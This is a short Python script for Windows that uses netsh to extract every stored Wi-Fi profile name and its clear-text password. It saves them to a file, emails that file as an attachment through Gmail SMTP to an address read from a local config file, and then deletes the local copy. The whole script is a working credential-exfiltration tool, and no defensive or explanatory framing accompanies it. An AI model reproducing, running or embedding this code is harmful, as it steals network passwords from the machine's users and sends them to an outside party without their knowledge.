import email, smtplib, ssl
import os,socket
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import subprocess

data = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]
a=[]
for wifi in wifis:
	results = subprocess.check_output(['netsh','wlan','show','profile',wifi,'key=clear']).decode('utf-8').split('\n')
	results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
	try:
		print('Name:',str(wifi),'Password:',str(results[0]))
	except IndexError:
		print('Name:',str(wifi),'Password:','No saved password')
	try:
		b='Name: '+str(wifi)+', Password: '+str(results[0])
		a.append(b)
	except IndexError:
		c='Name:'+str(wifi)+', Password:'+'No saved password'
		a.append(c)
print(a)

with open('emailaddress.txt','r') as f:
	sender_email = f.read()
	print(sender_email)

with open('emailpassword.txt', 'r') as f:
	password = f.read()
	print(password)

with open('emailsend.txt','r') as f:
	receiver_email = f.read()
	print(receiver_email)

subject = "Attachment from Python having list of "+str(socket.gethostname())+"'s all wifi name and password"
body = "This is an email with attachment sent from Python"

# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email  # Recommended for mass emails

# Add body to email
message.attach(MIMEText(body, "plain"))
f=open('Wifi passwords.txt','w')
s1='\n'.join(a)
f.write(s1)
f.close()
filename = "Wifi passwords.txt"  # In same directory as script

# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in to server using secure context and send email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)

os.remove("Wifi passwords.txt")
print("Retriving done")